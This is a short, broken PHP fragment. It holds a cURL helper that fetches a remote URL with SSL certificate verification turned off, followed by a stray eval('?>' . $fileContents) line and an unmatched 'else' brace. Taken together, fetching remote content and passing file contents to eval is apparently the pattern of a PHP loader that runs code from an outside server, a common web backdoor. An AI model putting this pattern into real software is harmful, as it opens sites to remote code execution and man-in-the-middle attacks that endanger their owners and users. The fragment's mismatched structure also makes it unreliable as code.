function fetch_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Optional, for bypassing SSL verification
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

    eval('?>' . $fileContents);
} else {
